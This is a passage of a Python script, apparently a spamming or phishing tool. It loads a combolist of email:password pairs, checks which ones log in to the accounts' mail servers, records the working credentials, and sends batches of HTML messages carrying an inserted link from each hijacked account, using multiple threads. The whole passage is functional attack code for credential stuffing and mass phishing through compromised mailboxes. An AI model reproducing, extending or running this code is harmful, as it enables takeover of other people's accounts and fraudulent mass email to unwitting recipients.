            print(f"{Fore.GREEN}✅ Email sent to {recipient} from {email} ({sent_count}/{min(batch_size, len(recipients))})")
            with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Email sent to {recipient} from {email}\n")
            time.sleep(1)  # 1-second interval
            
        server.quit()
        return True, f"Sent {sent_count} emails successfully"
    except smtplib.SMTPAuthenticationError:
        return False, f"Authentication failed for {email}"
    except smtplib.SMTPException as e:
        return False, f"SMTP error for {email}: {str(e)}"
    except socket.timeout:
        return False, f"Timeout connecting to {smtp_server}:{smtp_port}"
    except socket.gaierror:
        return False, f"Unable to resolve {smtp_server}"
    except Exception as e:
        return False, f"General error for {email}: {str(e)}"

def test_smtp(email: str, password: str, smtp_server: str, smtp_port: int, test_email: str, sender_name: str, subject: str, html_content: str, link: str, max_retries: int = 3) -> Tuple[bool, str]:
    """Tests SMTP connection and sends a test email, replacing {LINK} in HTML."""
    for attempt in range(max_retries):
        try:
            socket.create_connection((smtp_server, smtp_port), timeout=5)
            
            if smtp_port == 465:
                server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
            else:
                server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            
            server.ehlo()
            if smtp_port == 587:
                if not server.has_extn('STARTTLS'):
                    server.quit()
                    return False, f"STARTTLS not supported on {smtp_server}:{smtp_port}"
                server.starttls()
                server.ehlo()
            
            if not server.has_extn('AUTH'):
                server.quit()
                return False, f"AUTH not supported on {smtp_server}:{smtp_port}"
            
            server.login(email, password)
            
            msg = MIMEMultipart('alternative')
            msg['Subject'] = subject
            msg['From'] = f'"{sender_name}" <{email}>'
            msg['To'] = test_email
            
            # Replace {LINK} with the actual link
            final_html = html_content.replace('{LINK}', link)
            part = MIMEText(final_html, 'html')
            msg.attach(part)
            
            server.send_message(msg)
            server.quit()
            with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Test successful for {email} on {smtp_server}:{smtp_port}\n")
            return True, "Connection and test send successful"
        except smtplib.SMTPAuthenticationError:
            return False, f"Authentication failed for {email}"
        except smtplib.SMTPException as e:
            if "421" in str(e) or "too many" in str(e).lower():
                if attempt < max_retries - 1:
                    time.sleep(2 ** (attempt + 1))
                    continue
                return False, f"SMTP error (rate limit) for {email}: {str(e)}"
            return False, f"SMTP error for {email}: {str(e)}"
        except socket.timeout:
            return False, f"Timeout connecting to {smtp_server}:{smtp_port}"
        except socket.gaierror:
            return False, f"Unable to resolve {smtp_server}"
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            return False, f"General error for {email}: {str(e)}"
    return False, "Failed after multiple attempts"

def find_and_test_smtp(email: str, password: str, test_email: str, sender_name: str, subject: str, html_content: str, link: str, recipients: List[str], sent_recipients: Set[str]) -> Optional[Tuple[str, int, str]]:
    """Finds and tests SMTP servers, then sends emails to recipients."""
    domain = email.lower().split('@')[-1]
    
    if not check_spf(domain):
        print(f"{Fore.YELLOW}⚠️ No valid SPF record for {domain}{Style.RESET_ALL}")
        return None, f"No valid SPF record for {domain}"
    
    mx_records = get_mx_records(domain)
    if not mx_records:
        print(f"{Fore.RED}❌ No MX records found for {domain}{Style.RESET_ALL}")
        return None, f"No MX records found for {domain}"
    
    for smtp_server, smtp_port in mx_records:
        if smtp_server is None:
            continue
        print(f"{Fore.CYAN}🔍 Attempting connection for {email} on {smtp_server}:{smtp_port}{Style.RESET_ALL}")
        success, message = test_smtp(email, password, smtp_server, smtp_port, test_email, sender_name, subject, html_content, link)
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {email} on {smtp_server}:{smtp_port} - {message}\n")
        
        if success:
            print(f"{Fore.GREEN}✅ SUCCESS: SMTP valid for {email} on {smtp_server}:{smtp_port}{Style.RESET_ALL}")
            remaining_recipients = [r for r in recipients if r not in sent_recipients]
            if remaining_recipients:
                print(f"{Fore.CYAN}📤 Sending {min(200, len(remaining_recipients))} emails from {email}{Style.RESET_ALL}")
                batch_success, batch_message = send_batch_emails(
                    email, password, smtp_server, smtp_port, remaining_recipients, sender_name, subject, html_content, link
                )
                if batch_success:
                    sent_recipients.update(remaining_recipients[:200])
                    print(f"{Fore.GREEN}✅ {batch_message}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Batch send failed: {batch_message}{Style.RESET_ALL}")
                    with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}:{batch_message}\n")
            return smtp_server, smtp_port, message
        else:
            print(f"{Fore.RED}❌ FAILURE: {message}{Style.RESET_ALL}")
    
    return None, f"No valid SMTP server for {email}"

def process_combo(email: str, password: str, test_email: str, sender_name: str, subject: str, html_content: str, link: str, recipients: List[str], sent_recipients: Set[str], results_lock: threading.Lock):
    """Processes an email:password combination."""
    if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email):
        with results_lock:
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"Invalid email: {email}\n")
            print(f"{Fore.RED}❌ Invalid email: {email}{Style.RESET_ALL}")
        return
    if not password.strip():
        with results_lock:
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"Empty password for {email}\n")
            print(f"{Fore.RED}❌ Empty password for {email}{Style.RESET_ALL}")
        return
    
    result, message = find_and_test_smtp(email, password, test_email, sender_name, subject, html_content, link, recipients, sent_recipients)
    with results_lock:
        if result:
            smtp_server, smtp_port, _ = result
            with open('smtp_valid.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{smtp_server}:{smtp_port}\n")
        else:
            with open('smtp_errors.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{message}\n")

def load_recipients(recipient_file: str) -> List[str]:
    """Loads and validates the list of recipients."""
    recipients = []
    try:
        with open(recipient_file, 'r', encoding='utf-8') as file:
            for line in file:
                recipient = line.strip()
                if recipient and re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", recipient):
                    recipients.append(recipient)
                else:
                    print(f"{Fore.YELLOW}⚠️ Invalid recipient ignored: {recipient}{Style.RESET_ALL}")
                    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Invalid recipient ignored: {recipient}\n")
        return recipients
    except FileNotFoundError:
        print(f"{Fore.RED}❌ File {recipient_file} not found{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] File {recipient_file} not found\n")
        return []
    except Exception as e:
        print(f"{Fore.RED}❌ Error loading recipients: {str(e)}{Style.RESET_ALL}")
        return []

def process_combolist(combo_file: str, test_email: str, sender_name: str, subject: str, html_file: str, link_file: str, recipient_file: str, max_workers: int = 10):
    """Processes the combolist with multithreading."""
    recipients = load_recipients(recipient_file)
    if not recipients:
        print(f"{Fore.RED}❌ No valid recipients. Stopping script.{Style.RESET_ALL}")
        return
    
    html_content = load_html_content(html_file)
    if not html_content:
        print(f"{Fore.RED}❌ Invalid HTML content. Stopping script.{Style.RESET_ALL}")
        return
    
    link = load_link(link_file)
    if not link:
        print(f"{Fore.RED}❌ Invalid link. Stopping script.{Style.RESET_ALL}")
        return
    
    sent_recipients: Set[str] = set()
    
    try:
        combos = []
        with open(combo_file, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                email, password = line.split(':', 1)
                combos.append((email, password))
        
        max_workers = min(max_workers, 10, max(1, math.ceil(len(combos) / 5)))
        print(f"{Fore.CYAN}ℹ Using {max_workers} threads for {len(combos)} combinations{Style.RESET_ALL}")
        
        results_lock = threading.Lock()
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [
                executor.submit(process_combo, email, password, test_email, sender_name, subject, html_content, link, recipients, sent_recipients, results_lock)
                for email, password in combos
            ]
            for future in as_completed(futures):
                future.result()
                remaining = len(recipients) - len(sent_recipients)
                if remaining <= 0:
                    print(f"{Fore.GREEN}✅ All recipients ({len(recipients)}) received an email. Stopping processing.{Style.RESET_ALL}")
                    return
                print(f"{Fore.CYAN}ℹ {remaining} recipients remaining to contact{Style.RESET_ALL}")
                
    except FileNotFoundError:
        print(f"{Fore.RED}❌ File {combo_file} not found{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] File {combo_file} not found\n")
    except Exception as e:
        print(f"{Fore.RED}❌ Error processing file: {str(e)}{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] File processing error: {str(e)}\n")

def main():
    combo_file = input("Enter the path to the combolist file (mail:pass): ")
    recipient_file = input("Enter the path to the recipients file: ")
    test_email = input("Enter the destination email for SMTP testing: ")
    if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", test_email):
        print(f"{Fore.RED}❌ Invalid destination email. Stopping script.{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Invalid destination email: {test_email}\n")
        return
    sender_name = input("Enter the sender name (e.g., John Doe): ")
    subject = input("Enter the email subject: ")
    html_file = input("Enter the path to the HTML content file: ")
    link_file = input("Enter the path to the LINK.txt file: ")
    
    max_workers = int(input("Enter the number of threads (max 10, default 10): ") or 10)
    print(f"{Fore.CYAN}ℹ Starting processing of {combo_file} with {len(load_recipients(recipient_file))} recipients{Style.RESET_ALL}")
    with open('smtp_log.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting processing: {combo_file}, test_email: {test_email}, recipients: {recipient_file}, html: {html_file}, link: {link_file}, threads: {max_workers}\n")
    
    process_combolist(combo_file, test_email, sender_name, subject, html_file, link_file, recipient_file, max_workers)
    print(f"{Fore.GREEN}✅ Processing complete. Results in 'smtp_valid.txt', errors in 'smtp_errors.txt', logs in 'smtp_log.txt'.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()